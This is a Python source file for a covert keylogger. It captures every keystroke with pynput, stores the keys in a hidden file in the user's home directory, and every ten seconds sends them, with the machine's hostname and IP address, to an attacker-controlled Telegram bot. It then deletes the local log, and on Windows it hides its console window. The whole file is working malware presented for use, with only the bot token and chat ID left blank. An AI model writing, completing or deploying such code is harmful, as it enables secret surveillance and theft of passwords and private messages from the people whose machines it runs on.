import time
import requests
import os
import sys
import socket
from pynput import keyboard



# Get Device Name
device_name = socket.gethostname()
# Get IP Address
ip_address = socket.gethostbyname(device_name)

# Telegram bot details
BOT_TOKEN = "Enter your bot token here"
CHAT_ID = "Enter your chat id here"
LOG_FILE = os.path.expanduser("~/.keylog")  # Hidden file in user home directory (Linux/macOS)
SEND_INTERVAL = 10  # Send data every 10 seconds

def send_to_telegram():
    """Send the stored keystrokes to Telegram when online."""
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        with open(LOG_FILE, "r") as file:
            logs = file.read()
        
        message = f"Keystrokes From ~ ({device_name} | IP: {ip_address} :- \n{logs}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message}
        
        try:
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                os.remove(LOG_FILE)  # Delete logs after sending
            else:
                print("[!] Failed to send logs, keeping file for retry.")
        except requests.exceptions.RequestException:
            pass  # No internet, keep logs for later

def save_logs_locally(log_text):
    """Save keystrokes to a hidden file."""
    with open(LOG_FILE, "a") as file:
        file.write(log_text + "\n")

def on_press(key):
    """Handle key press events and save them."""
    try:
        log_text = key.char
    except AttributeError:
        log_text = f" {key} "

    save_logs_locally(log_text)

    

# Hide console window (Windows only)
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

listener = keyboard.Listener(on_press=on_press)
listener.start()

try:
    while True:
        time.sleep(SEND_INTERVAL)
        send_to_telegram()  # Try sending logs every interval
except KeyboardInterrupt:
    listener.stop()
    sys.exit(0)
